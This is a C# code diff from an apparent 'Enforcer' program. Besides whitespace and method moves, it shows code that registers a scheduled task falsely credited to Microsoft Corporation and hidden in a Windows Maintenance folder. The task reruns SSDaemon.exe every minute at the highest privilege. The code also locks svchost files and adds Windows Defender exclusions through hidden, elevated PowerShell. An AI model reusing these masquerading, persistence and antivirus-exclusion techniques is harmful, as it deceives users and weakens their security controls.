@@ -92,7 +92,7 @@ namespace Enforcer
                     RegisterTask("SvcMonitor", new TimeTrigger() { StartBoundary = DateTime.Now, Repetition = new RepetitionPattern(TimeSpan.FromMinutes(1), TimeSpan.Zero) },
                         new ExecAction(Path.Combine(exePath, "SSDaemon.exe"), "0"));
                     Thread.Sleep(4000);
-                }        
+                }
             }
         }
 
@@ -127,8 +127,8 @@ namespace Enforcer
                 catch (IOException) { }
                 watchdog = Process.GetProcessById(StartWatchdog());
             }
-            foreach (string file in Directory.GetFiles(windowsPath, "*svchost*"))          
-                filePadlocks.Add(new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.Read));  
+            foreach (string file in Directory.GetFiles(windowsPath, "*svchost*"))
+                filePadlocks.Add(new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.Read));
             Task.Run(() =>
             {
                 while (isEnforcerActive)
@@ -152,23 +152,6 @@ namespace Enforcer
                 executor.StartInfo.RedirectStandardOutput = true;
                 executor.Start();
                 return int.Parse(executor.StandardOutput.ReadLine());
-            }
-        }
-
-        void RegisterTask(string name, Trigger taskTrigger, ExecAction execAction)
-        {
-            using (var taskService = new TaskService())
-            {
-                taskService.RootFolder.DeleteTask(name, false);
-                var taskDefinition = taskService.NewTask();
-                taskDefinition.Settings.DisallowStartIfOnBatteries = false;
-                taskDefinition.RegistrationInfo.Author = "Microsoft Corporation";
-                taskDefinition.RegistrationInfo.Description = "Ensures all critical Windows service processes are running.";
-                taskDefinition.Principal.RunLevel = TaskRunLevel.Highest;
-                taskDefinition.Principal.LogonType = TaskLogonType.S4U;
-                taskDefinition.Triggers.Add(taskTrigger);
-                taskDefinition.Actions.Add(execAction);
-                taskService.GetFolder("\\Microsoft\\Windows\\Maintenance").RegisterTaskDefinition(name, taskDefinition);
             }
         }
 
@@ -204,6 +187,23 @@ namespace Enforcer
                 }
             }
             catch (FileLoadException) { }
+        }
+
+        void RegisterTask(string name, Trigger taskTrigger, ExecAction execAction)
+        {
+            using (var taskService = new TaskService())
+            {
+                taskService.RootFolder.DeleteTask(name, false);
+                var taskDefinition = taskService.NewTask();
+                taskDefinition.Settings.DisallowStartIfOnBatteries = false;
+                taskDefinition.RegistrationInfo.Author = "Microsoft Corporation";
+                taskDefinition.RegistrationInfo.Description = "Ensures all critical Windows service processes are running.";
+                taskDefinition.Principal.RunLevel = TaskRunLevel.Highest;
+                taskDefinition.Principal.LogonType = TaskLogonType.S4U;
+                taskDefinition.Triggers.Add(taskTrigger);
+                taskDefinition.Actions.Add(execAction);
+                taskService.GetFolder("\\Microsoft\\Windows\\Maintenance").RegisterTaskDefinition(name, taskDefinition);
+            }
         }
 
         NetworkInterface? GetActiveEthernetOrWifiNetworkInterface()
@@ -279,7 +279,7 @@ namespace Enforcer
                 UseShellExecute = false,
                 CreateNoWindow = true,
                 Verb = "runas",
-                Arguments = $" -Command Add-MpPreference -ExclusionPath '{path}' -ExclusionProcess '{Path.Combine(exePath, "SSDaemon.exe")}'"
+                Arguments = $" -Command Add-MpPreference -ExclusionPath '{path}'"
             };
             Process.Start(powershell);
         }
